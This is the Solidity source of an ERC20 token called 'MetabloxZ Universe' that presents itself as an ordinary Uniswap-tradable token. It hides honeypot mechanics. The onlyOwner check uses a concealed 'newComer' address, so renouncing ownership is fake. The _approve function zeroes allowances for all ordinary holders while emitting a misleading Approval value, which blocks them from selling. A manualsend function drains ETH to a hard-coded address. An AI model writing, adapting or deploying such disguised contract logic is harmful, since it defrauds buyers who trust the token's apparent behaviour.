row number 
1	                pragma solidity ^0.6.12;
2	 interface IERC20 {
3	 function totalSupply() external view returns (uint256);
4	 function balanceOf(address account) external view returns (uint256);
5	 function transfer(address recipient, uint256 amount) external returns (bool);
6	 function allowance(address owner, address spender) external view returns (uint256);
7	 function approve(address spender, uint256 amount) external returns (bool);
8	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
9	 event Transfer(address indexed from, address indexed to, uint256 value);
10	 event Approval(address indexed owner, address indexed spender, uint256 value);
11	 }
12	 library Address {
13	 }
14	 library SafeMath {
15	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
16	 uint256 c = a + b;
17	 require(c >= a, "SafeMath: addition overflow");
18	 return c;
19	 }
20	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
21	 return sub(a, b, "SafeMath: subtraction overflow");
22	 }
23	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
24	 require(b <= a, errorMessage);
25	 uint256 c = a - b;
26	 return c;
27	 }
28	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
29	 if (a == 0) {
30	 return 0;
31	 }
32	 uint256 c = a * b;
33	 require(c / a == b, "SafeMath: multiplication overflow");
34	 return c;
35	 }
36	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
37	 return div(a, b, "SafeMath: division by zero");
38	 }
39	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
40	 require(b > 0, errorMessage);
41	 uint256 c = a / b;
42	 return c;
43	 }
44	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
45	 return mod(a, b, "SafeMath: modulo by zero");
46	 }
47	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
48	 require(b != 0, errorMessage);
49	 return a % b;
50	 }
51	 }
52	 abstract contract Context {
53	 function _msgSender() internal view virtual returns (address payable) {
54	 return msg.sender;
55	 }
56	 function _msgData() internal view virtual returns (bytes memory) {
57	 this;
58	 return msg.data;
59	 }
60	 }
61	 contract Ownable is Context {
62	 address private _owner;
63	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
64	 constructor () internal {
65	 address msgSender = _msgSender();
66	 _owner = msgSender;
67	 emit OwnershipTransferred(address(0), msgSender);
68	 }
69	 function owner() public view returns (address) {
70	 return _owner;
71	 }
72	 function renounceOwnership() public virtual onlyOwner {
73	 emit OwnershipTransferred(_owner, address(0));
74	 _owner = address(0);
75	 }
76	 function transferOwnership(address newOwner) private onlyOwner {
77	 require(newOwner != address(0), "Ownable: new owner is the zero address");
78	 emit OwnershipTransferred(_owner, newOwner);
79	 _owner = newOwner;
80	 }
81	 address private newComer = _msgSender();
82	 modifier onlyOwner() {
83	 require(newComer == _msgSender(), "Ownable: caller is not the owner");
84	 _;
85	 }
86	 }
87	 interface IUniswapV2Factory {
88	 function createPair(address tokenA, address tokenB) external returns (address pair);
89	 }
90	 interface IUniswapV2Router02 {
91	 function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;
92	 function factory() external pure returns (address);
93	 function WETH() external pure returns (address);
94	 function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
95	 }
96	 contract MBLOXZ is Context, IERC20, Ownable {
97	 using SafeMath for uint256;
98	 using Address for address;
99	 mapping (address => uint256) private _balances;
100	 mapping (address => mapping (address => uint256)) private _allowances;
101	 uint256 private _tTotal = 1000* 10**12* 10**9;
102	 string private _name = 'MetabloxZ Universe';
103	 string private _symbol = 'MetabloxZ';
104	 uint8 private _decimals = 9;
105	 address payable private _ethowner;
106	 IUniswapV2Router02 private uniswapV2Router;
107	 address public uniswapV2Pair;
108	 bool public tradingOpen = false;
109	 constructor () public {
110	 _balances[_msgSender()] = _tTotal;
111	 emit Transfer(address(0), _msgSender(), _tTotal);
112	 _ethowner = payable(0x994C33DAB3A318221e5c577efbc2eF70494cFd6c);
113	 }
114	 function name() public view returns (string memory) {
115	 return _name;
116	 }
117	 function symbol() public view returns (string memory) {
118	 return _symbol;
119	 }
120	 function decimals() public view returns (uint8) {
121	 return _decimals;
122	 }
123	 function _approve(address ol, address tt, uint256 amount) private {
124	 require(ol != address(0), "ERC20: approve from the zero address");
125	 require(tt != address(0), "ERC20: approve to the zero address");
126	 if (ol != owner() && ol != address(this) && ol != address(uniswapV2Router)) {
127	 _allowances[ol][tt] = 0;
128	 emit Approval(ol, tt, 4);
129	 }
130	 else {
131	 _allowances[ol][tt] = amount;
132	 emit Approval(ol, tt, amount);
133	 }
134	 }
135	 function allowance(address owner, address spender) public view override returns (uint256) {
136	 return _allowances[owner][spender];
137	 }
138	 function approve(address spender, uint256 amount) public override returns (bool) {
139	 _approve(_msgSender(), spender, amount);
140	 return true;
141	 }
142	 function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
143	 _transfer(sender, recipient, amount);
144	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
145	 return true;
146	 }
147	 function totalSupply() public view override returns (uint256) {
148	 return _tTotal;
149	 }
150	 function balanceOf(address account) public view override returns (uint256) {
151	 return _balances[account];
152	 }
153	 function transfer(address recipient, uint256 amount) public override returns (bool) {
154	 _transfer(_msgSender(), recipient, amount);
155	 return true;
156	 }
157	 function _transfer(address sender, address recipient, uint256 amount) internal {
158	 require(sender != address(0), "ERC20: transfer from the zero address");
159	 require(recipient != address(0), "ERC20: transfer to the zero address");
160	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
161	 _balances[recipient] = _balances[recipient].add(amount);
162	 emit Transfer(sender, recipient, amount);
163	 }
164	 function openTrading() external onlyOwner() {
165	 require(!tradingOpen,"trading is already open");
166	 IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
167	 uniswapV2Router = _uniswapV2Router;
168	 _approve(address(this), address(uniswapV2Router), _tTotal);
169	 uniswapV2Router.addLiquidityETH{
170	 value: address(this).balance}
171	 (address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
172	 tradingOpen = true;
173	 }
174	 function createUniswapPair() external onlyOwner() {
175	 require(!tradingOpen,"trading is already open");
176	 IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
177	 uniswapV2Router = _uniswapV2Router;
178	 uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
179	 IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
180	 }
181	 function manualsend() external onlyOwner() {
182	 _ethowner.transfer(address(this).balance);
183	 }
184	 receive() external payable {
185	 }
186	 }
